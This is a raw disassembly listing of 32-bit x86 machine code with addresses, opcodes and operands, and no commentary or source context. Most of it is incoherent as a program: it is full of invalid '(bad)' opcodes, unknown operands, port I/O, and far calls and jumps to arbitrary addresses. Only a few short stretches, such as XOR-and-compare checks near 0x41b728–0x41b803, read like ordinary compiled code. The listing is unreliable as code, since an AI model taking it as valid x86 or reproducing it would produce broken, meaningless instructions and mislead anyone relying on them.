  41b1a3:	mov    esi,0x9dfc0f73
  41b1a8:	fsub   DWORD PTR [edx+0xf]
  41b1ab:	mov    BYTE PTR [esi],dl
  41b1ad:	sub    eax,0x1e4123c6
  41b1b2:	retf   0x4254
  41b1b5:	test   BYTE PTR [ebx+0x63af6b92],al
  41b1bb:	int    0x3f
  41b1bd:	pushf  
  41b1be:	stos   DWORD PTR es:[edi],eax
  41b1bf:	arpl   WORD PTR [edi],bp
  41b1c1:	popa   
  41b1c2:	fldenv [edi+0x32]
  41b1c5:	cmp    eax,0xeca685f6
  41b1ca:	(bad)  
  41b1cb:	xchg   ecx,eax
  41b1cc:	jo     0x41b156
  41b1ce:	xor    bh,dh
  41b1d0:	call   0x570e:0x2f5182e6
  41b1d7:	ins    BYTE PTR es:[edi],dx
  41b1d8:	dec    ecx
  41b1d9:	sub    ebx,edi
  41b1db:	aas    
  41b1dc:	fucomip st,st(0)
  41b1de:	pop    ebp
  41b1df:	daa    
  41b1e0:	sbb    eax,0x32dc52fa
  41b1e5:	pop    edi
  41b1e6:	scas   al,BYTE PTR es:[edi]
  41b1e7:	mov    edi,0x2dba9226
  41b1ec:	arpl   WORD PTR fs:[eax-0x15c76313],di
  41b1f3:	repz dec ebx
  41b1f5:	xchg   dl,ah
  41b1f7:	pushf  
  41b1f8:	lock retf 
  41b1fa:	nop
  41b1fb:	cli    
  41b1fc:	stc    
  41b1fd:	dec    ecx
  41b1fe:	jmp    0xf0c5001d
  41b203:	mov    al,ds:0xcf0bb8f5
  41b208:	std    
  41b209:	lods   eax,DWORD PTR ds:[esi]
  41b20a:	bound  edi,QWORD PTR [eax-0x7e]
  41b20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b20e:	shr    cl,1
  41b210:	sbb    DWORD PTR [ecx+0x2c79b66b],ebp
  41b216:	jne    0x41b22b
  41b218:	sbb    BYTE PTR [ebp+0xfdc84b7],0x4e
  41b21f:	xchg   ebx,eax
  41b220:	xchg   edi,eax
  41b221:	and    ebx,esi
  41b223:	jno    0x41b239
  41b225:	jb     0x41b26a
  41b227:	sub    al,0x31
  41b229:	sub    cl,BYTE PTR [eax]
  41b22b:	mov    esi,0xea88ee9a
  41b230:	ret    0x3650
  41b233:	fmul   DWORD PTR [ebx]
  41b235:	cmp    ah,BYTE PTR [ebp-0x326c4e4f]
  41b23b:	sub    esi,ecx
  41b23d:	dec    ebx
  41b23e:	retf   0xf42
  41b241:	pop    edx
  41b242:	in     eax,0xa5
  41b244:	out    0x42,eax
  41b246:	push   ds
  41b247:	dec    esi
  41b248:	adc    BYTE PTR [ebx+eax*8-0x4f855410],dl
  41b24f:	pushf  
  41b250:	inc    edi
  41b251:	add    edi,edx
  41b253:	dec    edx
  41b254:	loopne 0x41b239
  41b256:	iret   
  41b257:	mov    ebx,0xae68d632
  41b25c:	push   eax
  41b25d:	and    DWORD PTR [edi],eax
  41b25f:	cs inc eax
  41b261:	sahf   
  41b262:	sbb    eax,0xb5d244db
  41b267:	cmp    edx,DWORD PTR [ebx+0x30]
  41b26a:	hlt    
  41b26b:	mov    dl,0x4a
  41b26d:	xchg   ecx,eax
  41b26e:	inc    BYTE PTR [ecx-0x1c]
  41b271:	in     eax,dx
  41b272:	ror    DWORD PTR [ebx],0x39
  41b275:	and    DWORD PTR [eax],ebp
  41b277:	inc    eax
  41b278:	cmp    DWORD PTR [edx+0x36a7dd77],ecx
  41b27e:	lock stos DWORD PTR es:[edi],eax
  41b280:	into   
  41b281:	or     eax,0xfe817ed9
  41b286:	xchg   ebp,eax
  41b287:	imul   edi,DWORD PTR [eax+esi*2-0xb],0xdcefbeb8
  41b28f:	adc    eax,0xd2a6414f
  41b294:	xchg   ebp,eax
  41b295:	popf   
  41b296:	adc    BYTE PTR ds:0xbc15529b,al
  41b29c:	pop    edx
  41b29d:	jb     0x41b311
  41b29f:	inc    ebp
  41b2a0:	scas   al,BYTE PTR es:[edi]
  41b2a1:	xchg   BYTE PTR [eax-0xc39f88e],ah
  41b2a7:	jbe    0x41b26e
  41b2a9:	xchg   edx,eax
  41b2aa:	jne    0x41b2ab
  41b2ac:	ja     0x41b2c8
  41b2ae:	or     eax,0x67170ce2
  41b2b3:	pop    ecx
  41b2b4:	ret    
  41b2b5:	nop
  41b2b6:	cs xor ecx,ebp
  41b2b9:	lods   al,BYTE PTR ds:[esi]
  41b2ba:	inc    ebp
  41b2bb:	arpl   WORD PTR [edi],cx
  41b2bd:	mov    ebx,0xa11891d0
  41b2c2:	jae    0x41b26d
  41b2c4:	fisttp QWORD PTR [edi+edi*1]
  41b2c7:	jmp    0x41b30e
  41b2c9:	push   ebx
  41b2ca:	ret    0x4edd
  41b2cd:	dec    edi
  41b2ce:	mov    dl,0x88
  41b2d0:	sbb    BYTE PTR [esi+0x7],0x10
  41b2d4:	pop    edi
  41b2d5:	jno    0x41b276
  41b2d7:	push   ebx
  41b2d8:	in     eax,dx
  41b2d9:	sub    BYTE PTR [edx+edx*2+0x533f87c6],bl
  41b2e0:	iret   
  41b2e1:	or     dl,cl
  41b2e3:	in     eax,0x39
  41b2e5:	(bad)  
  41b2e6:	aad    0xad
  41b2e8:	cmp    BYTE PTR [edi+0x76],0x80
  41b2ec:	bound  eax,QWORD PTR [eax-0x6e3cf60d]
  41b2f2:	neg    DWORD PTR [esi-0xe5fcd3f]
  41b2f8:	xchg   edi,eax
  41b2f9:	shl    DWORD PTR [ebp+eiz*1-0x694128b9],0x61
  41b301:	shl    edx,cl
  41b303:	sub    dl,al
  41b305:	xlat   BYTE PTR ds:[ebx]
  41b306:	arpl   WORD PTR [eax],bx
  41b308:	(bad)  
  41b309:	into   
  41b30a:	test   DWORD PTR [ebx+0x129f4d5f],0x9bab71ed
  41b314:	jno    0x41b381
  41b316:	scas   al,BYTE PTR es:[edi]
  41b317:	sbb    al,0x65
  41b319:	in     al,0x13
  41b31b:	aam    0xa9
  41b31d:	xor    ch,BYTE PTR [edi+0x362db0ee]
  41b323:	outs   dx,DWORD PTR ds:[esi]
  41b324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b325:	jle    0x41b356
  41b327:	jmp    0x41b35d
  41b329:	pop    ecx
  41b32a:	xor    BYTE PTR [edi-0x54],al
  41b32d:	in     eax,dx
  41b32e:	lock mov edx,0xbb121aee
  41b334:	xchg   BYTE PTR [eax+edi*8],dl
  41b337:	dec    edx
  41b338:	or     al,0x2f
  41b33a:	ins    BYTE PTR es:[edi],dx
  41b33b:	inc    esi
  41b33c:	inc    ebp
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	jns    0x41b376
  41b369:	aas    
  41b36a:	mov    esi,0x18168fbb
  41b36f:	mov    esp,0x40181812
  41b374:	or     edi,DWORD PTR [eax-0x5da92d0a]
  41b37a:	mov    esi,0x4541a8ed
  41b37f:	sub    al,0x2e
  41b381:	mov    bl,0xf
  41b383:	jne    0x41b340
  41b385:	dec    edi
  41b386:	and    ebp,DWORD PTR [ecx]
  41b388:	xor    cl,dl
  41b38a:	sbb    DWORD PTR [edi-0x11],ebp
  41b38d:	mov    esp,0xdaf65a33
  41b392:	jmp    0xbe97:0xce511a95
  41b399:	xchg   eax,edx
  41b39b:	mul    DWORD PTR [edx+0x6f90ab2b]
  41b3a1:	pop    edi
  41b3a2:	lods   eax,DWORD PTR ds:[esi]
  41b3a3:	fmul   QWORD PTR [edx]
  41b3a5:	gs add al,0xb0
  41b3a8:	cmp    edi,DWORD PTR ds:0xbcc3b084
  41b3ae:	fnstsw WORD PTR [esi]
  41b3b0:	aas    
  41b3b1:	mov    al,ds:0xb4295e4
  41b3b6:	jbe    0x41b373
  41b3b8:	cmc    
  41b3b9:	mov    ah,0x5e
  41b3bb:	push   cs
  41b3bc:	lea    ecx,[edx-0x31]
  41b3bf:	pop    esp
  41b3c0:	and    cl,BYTE PTR [edi]
  41b3c2:	mov    esp,0x2f8bc454
  41b3c7:	pusha  
  41b3c8:	sub    ah,BYTE PTR [ebp-0x1b]
  41b3cb:	push   eax
  41b3cc:	in     eax,0x5e
  41b3ce:	scas   al,BYTE PTR es:[edi]
  41b3cf:	les    ebx,FWORD PTR [edx]
  41b3d1:	mov    al,ds:0x4f79a6d8
  41b3d6:	mov    DWORD PTR [ecx-0x2],ecx
  41b3d9:	pop    ds
  41b3da:	mov    ecx,0xc866b02d
  41b3df:	sbb    dh,BYTE PTR [esi+0x7f8e5d0f]
  41b3e5:	fwait
  41b3e6:	pop    eax
  41b3e7:	pop    esp
  41b3e8:	xchg   ebx,eax
  41b3e9:	es mov esi,0xc3ddb847
  41b3ef:	into   
  41b3f0:	push   edi
  41b3f1:	xchg   esi,eax
  41b3f2:	sub    al,0xe4
  41b3f4:	clc    
  41b3f5:	mov    ds:0xf9b1f45c,al
  41b3fa:	leave  
  41b3fb:	adc    BYTE PTR [edi+0x1351bc96],ah
  41b401:	or     eax,DWORD PTR [ecx-0x6312a1e]
  41b407:	xchg   ebp,eax
  41b408:	adc    DWORD PTR [esi],0x77
  41b40b:	es scas eax,DWORD PTR es:[edi]
  41b40d:	pop    es
  41b40e:	cmp    eax,0x6b37e7e1
  41b413:	jns    0x41b3ba
  41b415:	ret    0x4bd7
  41b418:	sar    BYTE PTR [edi-0x50],cl
  41b41b:	loope  0x41b497
  41b41d:	(bad)  
  41b41e:	mov    eax,0x2b33bf2
  41b423:	imul   ebx,DWORD PTR [ebx*2-0x63b9d1ae],0x2
  41b42b:	mov    esp,0x69386dac
  41b430:	stos   DWORD PTR es:[edi],eax
  41b431:	xchg   esp,eax
  41b432:	arpl   WORD PTR [ebp+0x35],di
  41b435:	push   edx
  41b436:	jb     0x41b42f
  41b438:	cmovg  esp,eax
  41b43b:	pop    ds
  41b43c:	loope  0x41b3d7
  41b43e:	call   0x2fa01913
  41b443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b444:	jae    0x41b45a
  41b446:	lahf   
  41b447:	inc    ebx
  41b448:	aam    0x54
  41b44a:	fdiv   DWORD PTR [edi]
  41b44c:	les    edx,FWORD PTR [eax+0x24]
  41b44f:	dec    esi
  41b450:	mov    WORD PTR [edi],ss
  41b452:	imul   esp,DWORD PTR [ebx+0x3ce60f7b],0xb092725d
  41b45c:	neg    DWORD PTR [edi-0x5450420e]
  41b462:	sbb    esp,DWORD PTR [edx+0x19a0ac82]
  41b468:	popa   
  41b469:	imul   edx,DWORD PTR [ecx+0x12d10020],0x6d
  41b470:	fld    DWORD PTR [edi-0x26]
  41b473:	xchg   DWORD PTR [eax+0x44],edi
  41b476:	dec    eax
  41b477:	ja     0x41b453
  41b479:	mov    BYTE PTR [esi-0x60],dl
  41b47c:	loop   0x41b4b3
  41b47e:	fldln2 
  41b480:	push   ss
  41b481:	out    dx,eax
  41b482:	mov    ah,0xd
  41b484:	mov    dh,0xb5
  41b486:	nop
  41b487:	test   eax,0x810a411c
  41b48c:	(bad)  
  41b48d:	sbb    eax,0x375addf
  41b492:	jl     0x41b4d8
  41b494:	cmp    DWORD PTR [ebx-0x30b00d10],eax
  41b49a:	xchg   dl,ah
  41b49c:	rcr    DWORD PTR [ebp+0x2f2583f4],0x4b
  41b4a3:	and    cl,bl
  41b4a5:	push   ebp
  41b4a6:	repnz or edi,DWORD PTR [edx+eax*8+0x1d833ae6]
  41b4ae:	call   0xa6cc:0x142267a5
  41b4b5:	aaa    
  41b4b6:	test   al,0x21
  41b4b8:	pop    ecx
  41b4b9:	sbb    DWORD PTR [edi+0x19],eax
  41b4bc:	in     al,dx
  41b4bd:	xchg   DWORD PTR [esi],eax
  41b4bf:	adc    BYTE PTR [edx-0xc2356df],dh
  41b4c5:	outs   dx,DWORD PTR ds:[esi]
  41b4c6:	and    DWORD PTR [ebp+0x13f8b179],eax
  41b4cc:	add    edi,DWORD PTR [ecx+eiz*8+0x6ca8e151]
  41b4d3:	xor    DWORD PTR [ebp+0x733ee709],0xffffff9b
  41b4da:	loop   0x41b474
  41b4dc:	fldenv [eax-0x1abeb1c5]
  41b4e2:	inc    eax
  41b4e3:	xchg   esp,eax
  41b4e4:	pop    es
  41b4e5:	mov    cl,0x86
  41b4e7:	fnstsw WORD PTR [edx+0x40]
  41b4ea:	jmp    0x41b53f
  41b4ec:	cmp    edi,esp
  41b4ee:	retf   0xa980
  41b4f1:	xlat   BYTE PTR ds:[ebx]
  41b4f2:	shl    DWORD PTR [eax],1
  41b4f4:	lods   al,BYTE PTR ds:[esi]
  41b4f5:	into   
  41b4f6:	sbb    DWORD PTR [esi-0x4e],edi
  41b4f9:	in     eax,dx
  41b4fa:	test   al,0xd9
  41b4fc:	sar    BYTE PTR [ebp+0x52],1
  41b4ff:	retf   
  41b500:	xchg   edi,eax
  41b501:	add    eax,0x7b99b1e5
  41b506:	mov    ?,WORD PTR [eax-0x3e]
  41b509:	pop    ecx
  41b50a:	mov    BYTE PTR [ebx],bl
  41b50c:	push   ecx
  41b50d:	ficom  DWORD PTR [edi]
  41b50f:	jbe    0x41b570
  41b511:	mov    ds:0x67d66e1f,eax
  41b516:	bound  ebx,QWORD PTR [edx-0x68]
  41b519:	arpl   WORD PTR [ecx+0x12],si
  41b51c:	out    0x47,eax
  41b51e:	add    al,dl
  41b520:	(bad)  
  41b521:	gs in  eax,0x96
  41b524:	cmp    DWORD PTR [esi+0x66],esi
  41b527:	sub    ecx,DWORD PTR [edx]
  41b529:	push   0xf059a47c
  41b52e:	out    0xb0,al
  41b530:	ror    DWORD PTR [esi],0x76
  41b533:	pop    ecx
  41b534:	mov    ds:0x8b6b64ac,al
  41b539:	js     0x41b508
  41b53b:	retf   0x7450
  41b53e:	inc    esi
  41b53f:	adc    ah,BYTE PTR [eax-0x79]
  41b542:	jecxz  0x41b55c
  41b544:	aam    0x32
  41b546:	jecxz  0x41b564
  41b548:	test   eax,0x21307f68
  41b54d:	jecxz  0x41b569
  41b54f:	or     BYTE PTR [ebp-0x6],bh
  41b552:	sbb    DWORD PTR [ebp+0xe],ecx
  41b555:	sub    DWORD PTR [eax],ecx
  41b557:	xlat   BYTE PTR ds:[ebx]
  41b558:	stc    
  41b559:	mov    bh,0x2e
  41b55b:	loop   0x41b50e
  41b55d:	add    BYTE PTR [edi+edx*8],0x81
  41b561:	sbb    edx,ebx
  41b563:	sbb    al,0xcc
  41b565:	lea    ebp,[ebp-0x1703e305]
  41b56b:	cwde   
  41b56c:	push   ds
  41b56d:	cmp    ch,al
  41b56f:	(bad)  
  41b570:	outs   dx,DWORD PTR ds:[esi]
  41b571:	mov    eax,ds:0xfbf2019f
  41b576:	adc    al,0x3d
  41b578:	or     eax,0xc8e41038
  41b57d:	popa   
  41b57e:	aam    0xb5
  41b580:	cdq    
  41b581:	aaa    
  41b582:	xchg   edi,eax
  41b583:	lods   al,BYTE PTR ds:[esi]
  41b584:	jbe    0x41b57c
  41b586:	int3   
  41b587:	fisttp DWORD PTR [esi+0x1c011d78]
  41b58d:	call   0xa5da2c6c
  41b592:	jae    0x41b5cf
  41b594:	mov    bl,0xaf
  41b596:	xchg   esi,eax
  41b597:	inc    esp
  41b598:	sub    eax,0x2d80e84e
  41b59d:	lds    edi,FWORD PTR [edx+ecx*2-0x27e0c4b7]
  41b5a4:	adc    al,bh
  41b5a6:	adc    edx,DWORD PTR [eax+0x705ab0b7]
  41b5ac:	out    0x5f,eax
  41b5ae:	cmp    eax,0x2333352c
  41b5b3:	popa   
  41b5b4:	repz sbb BYTE PTR [ebp+0x20],0xcd
  41b5b9:	push   ds
  41b5ba:	cmp    ecx,0xfffffff8
  41b5bd:	dec    edi
  41b5be:	lahf   
  41b5bf:	fcomp  QWORD PTR [edi]
  41b5c1:	xor    DWORD PTR ds:0x6d975316,ecx
  41b5c7:	mov    ds:0x8a7c6480,eax
  41b5cc:	xchg   esp,eax
  41b5cd:	(bad)  
  41b5ce:	pop    edi
  41b5cf:	jo     0x41b5b4
  41b5d1:	sbb    eax,0x26992ffa
  41b5d6:	or     dh,BYTE PTR [ebx-0x11e165d1]
  41b5dc:	mov    ds:0xbd12497e,eax
  41b5e1:	shl    BYTE PTR [ecx+0xd],1
  41b5e4:	stos   DWORD PTR es:[edi],eax
  41b5e5:	jb     0x41b607
  41b5e7:	cld    
  41b5e8:	lahf   
  41b5e9:	mov    WORD PTR [ebx+0x3],?
  41b5ec:	nop
  41b5ed:	add    bl,BYTE PTR [bp+si+0x459c]
  41b5f2:	jmp    0x41b5ca
  41b5f4:	xchg   ecx,eax
  41b5f5:	sbb    al,0x92
  41b5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5f8:	adc    edx,ebx
  41b5fa:	mov    dh,0xa9
  41b5fc:	mov    ds:0x57061184,eax
  41b601:	add    BYTE PTR [esi+esi*2-0x1c0233b8],bh
  41b608:	(bad)  
  41b609:	add    DWORD PTR [eax],0x51ac2dcc
  41b60f:	stc    
  41b610:	sbb    ah,BYTE PTR [edi-0x6096211f]
  41b616:	xchg   BYTE PTR [edx],bh
  41b618:	pusha  
  41b619:	mov    edi,0xb5e7a23b
  41b61e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b61f:	mov    dh,0x6a
  41b621:	dec    eax
  41b622:	and    DWORD PTR ds:0x3c709f7,ecx
  41b628:	sub    al,0xbb
  41b62a:	scas   al,BYTE PTR es:[edi]
  41b62b:	inc    esp
  41b62c:	jle    0x41b62f
  41b62e:	std    
  41b62f:	ss jno 0x41b66c
  41b632:	mov    ah,0x58
  41b634:	shl    DWORD PTR [ebp+0x2c16d090],cl
  41b63a:	int3   
  41b63b:	add    eax,0x1b7003f
  41b640:	mov    al,0x25
  41b642:	mov    esi,0x5e6cb72c
  41b647:	sub    eax,0x3603f826
  41b64c:	lea    esi,[edx]
  41b64e:	cmp    al,BYTE PTR [eax]
  41b650:	test   DWORD PTR [edi],0x1508561d
  41b656:	inc    ebx
  41b657:	cdq    
  41b658:	and    ebx,DWORD PTR [eax]
  41b65a:	cld    
  41b65b:	inc    ecx
  41b65c:	fwait
  41b65d:	out    dx,al
  41b65e:	jg     0x41b68b
  41b660:	xor    eax,0x8c04ea9b
  41b665:	inc    edx
  41b666:	(bad)  
  41b668:	fwait
  41b669:	mov    edx,DWORD PTR [esi-0x2c]
  41b66c:	push   es
  41b66d:	rcl    DWORD PTR [eax],1
  41b66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b670:	or     ch,BYTE PTR [esi-0x4ac78c49]
  41b676:	xor    al,0x7a
  41b678:	xchg   dh,ah
  41b67a:	and    al,0x6b
  41b67c:	xor    esp,DWORD PTR [edi+0x7]
  41b67f:	outs   dx,DWORD PTR ds:[esi]
  41b680:	sahf   
  41b681:	xor    ebx,DWORD PTR [eax]
  41b683:	push   0xffffff8a
  41b685:	nop
  41b686:	(bad)  
  41b687:	adc    ebp,DWORD PTR [ebx]
  41b689:	adc    dh,BYTE PTR [esi-0x262ca90a]
  41b68f:	pop    ss
  41b690:	cli    
  41b691:	dec    edx
  41b692:	dec    eax
  41b693:	jg     0x41b6df
  41b695:	imul   esp,DWORD PTR [edi],0x1d1156fb
  41b69b:	xor    BYTE PTR [edi+0x1b6a5da5],al
  41b6a1:	call   0x8eb8582d
  41b6a6:	add    esi,DWORD PTR [ebx+0xe94ab2f]
  41b6ac:	or     eax,esp
  41b6ae:	pop    ebp
  41b6af:	jbe    0x41b65a
  41b6b1:	cmp    al,0xfc
  41b6b3:	(bad)  
  41b6b4:	fimul  WORD PTR [ebx+eax*8-0x723e2108]
  41b6bb:	(bad)  
  41b6bc:	xchg   ecx,eax
  41b6bd:	not    DWORD PTR [ecx+0x6f8d94fe]
  41b6c3:	and    ebx,ecx
  41b6c5:	cmp    al,0xc8
  41b6c7:	sbb    BYTE PTR [eax+0x5678fd5],0x41
  41b6ce:	pop    ss
  41b6cf:	mov    dh,0xca
  41b6d1:	dec    ebp
  41b6d2:	inc    eax
  41b6d3:	mov    ebp,0xabd2f90d
  41b6d8:	dec    BYTE PTR [ecx+0x6e]
  41b6db:	sbb    eax,DWORD PTR [esi+0x6f]
  41b6de:	mov    cl,0xe0
  41b6e0:	mov    bh,0x78
  41b6e2:	cdq    
  41b6e3:	inc    ecx
  41b6e4:	add    edx,DWORD PTR [edi+0x11]
  41b6e7:	mov    edi,0xd1181b5c
  41b6ec:	and    ch,BYTE PTR [esi+0x6d]
  41b6ef:	fwait
  41b6f0:	sbb    DWORD PTR [eax+esi*2],ebp
  41b6f3:	push   es
  41b6f4:	mov    ecx,DWORD PTR [esi-0x14]
  41b6f7:	jmp    0x421558f5
  41b6fc:	inc    edi
  41b6fd:	dec    ecx
  41b6fe:	and    al,0xfb
  41b700:	xchg   ebp,eax
  41b701:	mov    cs,edi
  41b703:	enter  0x951d,0xb2
  41b707:	je     0x41b6b7
  41b709:	push   edx
  41b70a:	in     eax,dx
  41b70b:	push   ecx
  41b70c:	test   BYTE PTR [eax+eiz*1+0x62f8701d],0x9
  41b714:	inc    ebp
  41b715:	dec    esi
  41b716:	ss test al,0x56
  41b719:	idiv   dl
  41b71b:	push   ds
  41b71c:	shl    DWORD PTR [edx-0xf],1
  41b71f:	jnp    0x41b735
  41b721:	out    0x75,eax
  41b723:	dec    esi
  41b724:	jbe    0x41b6e7
  41b726:	loopne 0x41b746
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x422634
  41b758:	mov    DWORD PTR [esp+0x68],0x42262c
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x4225bc
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx-0x5d55d674],dh
  41b815:	leave  
  41b816:	shl    DWORD PTR [eax+0x5e],1
  41b819:	mov    DWORD PTR [esi],edx
  41b81b:	sbb    BYTE PTR [edx+edx*1-0x5e68e7e8],bh
  41b822:	in     eax,dx
  41b823:	xor    ch,dh
  41b825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b826:	into   
  41b827:	inc    ebx
  41b828:	mov    al,0x1a
  41b82a:	iret   
  41b82b:	dec    esi
  41b82c:	jnp    0x41b819
  41b82e:	dec    esi
  41b82f:	mov    BYTE PTR [ebp+edx*1-0x606d0f31],cl
  41b836:	(bad)  
  41b837:	out    dx,eax
  41b838:	cmp    al,ch
  41b83a:	popf   
  41b83b:	push   0x3b76ac4b
  41b840:	adc    dl,BYTE PTR [edx-0x1d]
  41b843:	mov    es,esp
  41b845:	fadd   DWORD PTR [eax]
  41b847:	repz aad 0x10
  41b84a:	jo     0x41b837
  41b84c:	pop    ebx
  41b84e:	fcmovnu st,st(5)
  41b850:	jmp    0x54461c42
  41b855:	mov    DWORD PTR [eax],0x6240d6d8
  41b85b:	je     0x41b7eb
  41b85d:	sub    bl,BYTE PTR [ebx]
  41b85f:	mov    ch,BYTE PTR [edi-0x75]
  41b862:	fwait
  41b863:	inc    eax
  41b864:	mov    edi,0x4e269ebf
  41b869:	adc    DWORD PTR [ecx+0x7],eax
  41b86c:	jo     0x41b837
  41b86e:	outs   dx,DWORD PTR ds:[esi]
  41b86f:	xor    BYTE PTR [edx+0x28],ch
  41b872:	push   0xffffffa4
  41b874:	and    edx,DWORD PTR [ebp+0x7567bc13]
  41b87a:	scas   al,BYTE PTR es:[edi]
  41b87b:	mov    eax,ds:0xfcaebcfa
  41b880:	ss fpatan 
  41b883:	(bad)  
  41b884:	repnz sti 
  41b886:	xor    dl,BYTE PTR [eax+0x66]
  41b889:	push   ss
  41b88a:	or     eax,0x14e8314a
  41b88f:	mov    ds:0x3eeda70c,al
  41b894:	out    0x66,al
  41b896:	pushf  
  41b897:	xlat   BYTE PTR ds:[ebx]
  41b898:	sub    esi,edi
  41b89a:	fisub  DWORD PTR [edi]
  41b89c:	pop    ss
  41b89d:	mov    edx,edi
  41b89f:	jmp    0x41b86a
  41b8a1:	mov    ?,edi
  41b8a3:	push   0x52
  41b8a5:	call   0xda5b9a96
  41b8aa:	mov    BYTE PTR [esi],bl
  41b8ac:	out    0xa3,eax
  41b8ae:	fcom   DWORD PTR [eax-0x551380dc]
  41b8b4:	xchg   BYTE PTR [esi+ecx*2],dl
  41b8b7:	adc    esi,DWORD PTR [eax+0x4f1efda1]
  41b8bd:	repz adc eax,edx
  41b8c0:	out    0x48,eax
  41b8c2:	arpl   WORD PTR [ebp+0x3a],sp
  41b8c5:	adc    edx,edx
  41b8c7:	push   ss
  41b8c8:	ds popf 
  41b8ca:	jae    0x41b873
  41b8cc:	adc    DWORD PTR [ebp-0x1d],edx
  41b8cf:	sub    eax,0x52bf753
  41b8d4:	popf   
  41b8d5:	das    
  41b8d6:	js     0x41b929
  41b8d8:	push   edi
  41b8d9:	push   edx
  41b8da:	sbb    ah,dl
  41b8dc:	sbb    bh,dl
  41b8de:	sub    ch,bl
  41b8e0:	mov    ebp,DWORD PTR [esi+0x6acaa2d6]
  41b8e6:	sub    eax,0x4dc92dd6
  41b8eb:	inc    DWORD PTR gs:[edx+0x3d721e39]
  41b8f2:	popa   
  41b8f3:	pusha  
  41b8f4:	push   cs
  41b8f5:	xchg   ecx,eax
  41b8f6:	jp     0x41b8ad
  41b8f8:	xor    eax,0x80c2bdc3
  41b8fd:	adc    BYTE PTR [esi],dh
  41b8ff:	sbb    cl,BYTE PTR [eax]
  41b901:	adc    al,0xc0
  41b903:	xchg   esi,eax
  41b904:	xor    eax,0xcb42ff0d
  41b909:	xchg   esi,eax
  41b90a:	repz ds mov ecx,0x98ec6bb0
  41b911:	xor    esi,esi
  41b913:	shr    BYTE PTR [ebx],cl
  41b915:	jl     0x41b8a8
  41b917:	inc    edx
  41b918:	popf   
  41b919:	mov    al,0x11
  41b91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b91c:	mov    bl,0x94
  41b91e:	fld    TBYTE PTR [edi+ebp*4]
  41b921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b922:	stc    
  41b923:	add    al,0x29
  41b925:	dec    ebp
  41b927:	sbb    dl,al
  41b929:	mov    edx,edx
  41b92b:	sbb    al,0x35
  41b92d:	pop    ecx
  41b92e:	bound  ebp,QWORD PTR [esi-0xc]
  41b931:	int    0xd8
  41b933:	sbb    BYTE PTR ds:0x8fb0d522,ch
  41b939:	call   0x482fdd3a
  41b93e:	dec    esp
  41b93f:	(bad)  
  41b940:	mov    ss,WORD PTR [esi-0x4a]
  41b943:	mov    eax,0x44c5b56e
  41b948:	jae    0x41b98d
  41b94a:	retf   0xd5de
  41b94d:	inc    ebx
  41b94e:	mov    bl,0x3d
  41b950:	lds    ebp,FWORD PTR [eax+ecx*4+0x7a]
  41b954:	mov    ebx,0x8756abe4
  41b959:	in     eax,0x3d
  41b95b:	neg    BYTE PTR [ebx-0x11f32c44]
  41b961:	pop    edx
  41b962:	test   al,0xea
  41b964:	jno    0x41b96c
  41b966:	mov    cl,0x3e
  41b968:	sahf   
  41b969:	mov    ch,0x41
